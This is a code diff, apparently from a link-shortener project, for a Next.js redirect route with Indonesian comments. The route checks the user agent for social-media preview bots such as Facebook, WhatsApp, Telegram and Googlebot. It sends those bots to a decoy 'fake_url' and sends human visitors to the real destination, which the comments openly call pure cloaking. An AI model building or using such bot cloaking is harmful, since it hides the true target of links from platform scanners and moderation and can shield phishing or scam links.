@@ -20,34 +20,23 @@ export async function GET(
     return NextResponse.json({ error: 'Link Not Found' }, { status: 404 });
   }
 
-  // 2. Baca Identitas Pengunjung (User-Agent & Referer)
-  const headersList = request.headers;
-  const userAgent = headersList.get('user-agent')?.toLowerCase() || '';
-  const referer = headersList.get('referer')?.toLowerCase() || '';
+  // 2. Baca Identitas Pengunjung (User-Agent)
+  const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
 
-  // Deteksi bot scraper (Cuma bot yang tugasnya narik data untuk preview)
-  const isBotScraper = /facebookexternalhit|whatsapp|telegrambot|twitterbot|slackbot|discordbot|bingbot|googlebot/i.test(userAgent);
+  // 3. DETEKSI BOT PREVIEW SOSMED
+  // Daftar lengkap bot yang cuma bertugas narik gambar/judul
+  const isBotScraper = /facebookexternalhit|whatsapp|telegrambot|twitterbot|linkedinbot|discordbot|slackbot|skypeuripreview|googlebot|bingbot/i.test(userAgent);
 
-  // --- LOGIKA REDIRECT V2 HARGA MATI ---
+  // --- LOGIKA REDIRECT V2 (CLOAKING MURNI) ---
 
-  // KONDISI 1: BOT SOSMED DATANG (Buat Preview) -> FAKE LINK
+  // KONDISI 1: BOT SOSMED DATANG (Preview) -> KASIH FAKE LINK
   if (isBotScraper && urlData.fake_url) {
     return Response.redirect(urlData.fake_url, 302);
   }
 
-  // KONDISI 2: ORANG KLIK DARI SOSMED (Ada jejak Referer) -> LINK TUJUAN ASLI
-  // Kalau referer gak kosong, artinya dia beneran ngeklik dari suatu tempat (sosmed, web lain)
-  if (referer.length > 0) {
-    // Tambah hitcount karena ada manusia asli yang ngeklik
-    supabase.from('urls').update({ hitcount: (urlData.hitcount || 0) + 1 }).eq('id', urlData.id).then();
-    return Response.redirect(urlData.original_url, 302);
-  }
-
-  // KONDISI 3: ORANG AKSES LANGSUNG KE BROWSER (Copy-Paste / Gak ada Referer) -> FAKE LINK
-  if (urlData.fake_url) {
-    return Response.redirect(urlData.fake_url, 302);
-  }
-
-  // Fallback (Jaga-jaga kalau fake_url kosong karena alasan tertentu)
+  // KONDISI 2: MANUSIA DATANG (Klik dari Sosmed, Tele, WA, atau Browser) -> KASIH LINK TUJUAN ASLI
+  // Update hitcount di background (jangan ditungguin biar load-nya instan)
+  supabase.from('urls').update({ hitcount: (urlData.hitcount || 0) + 1 }).eq('id', urlData.id).then();
+  
   return Response.redirect(urlData.original_url, 302);
 }
